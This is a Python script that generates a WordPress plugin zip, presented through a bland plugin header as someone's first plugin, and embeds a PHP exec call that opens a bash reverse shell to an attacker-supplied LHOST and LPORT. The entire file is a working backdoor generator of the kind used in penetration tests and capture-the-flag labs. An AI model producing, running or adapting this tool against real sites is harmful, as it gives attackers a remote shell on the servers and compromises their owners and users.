import argparse
import os
import shutil

parser = argparse.ArgumentParser()
parser.add_argument('-n',help="Name of the wordpress plugin",required=True)
parser.add_argument('-H',help="LHOST",required=True)
parser.add_argument('-P',help="LPORT",required=True)
parser.add_argument('-p',help="Path of a payload to embed")
args = parser.parse_args()


LHOST = args.H
LPORT = args.P
PL_NAME = args.n

def getPHPShellCode():
	shell = """exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'");"""%(LHOST,LPORT)
	return shell

def createHeader():
	header = f"""<?php
/**
* Plugin Name: %s
* Plugin URI: https://www.yourwebsiteurl.com/
* Description: This is the very first plugin I ever created.
* Version: 1.0
* Author: Your Name Here
* Author URI: http://yourwebsiteurl.com/
**/
"""%PL_NAME
	return header
	
def createPlugin():
	try:
		os.mkdir(PL_NAME)
		headercode = createHeader()
		headerfile = open(PL_NAME + "/" + PL_NAME + ".php","w")
		headerfile.write(headercode)
		headerfile.close()
		#add an if the user wants to add a custom payload here
		shellcode = getPHPShellCode()
		shellfile = open(PL_NAME + "/" + PL_NAME + ".php","a")
		shellfile.write(shellcode + "?>")
		shellfile.close()
		#zip files here
		shutil.make_archive(PL_NAME,'zip',PL_NAME)
		shutil.rmtree(PL_NAME)
	except FileExistsError:
		print(f"There's already a directory with the name \"{PL_NAME}\"")

createPlugin()
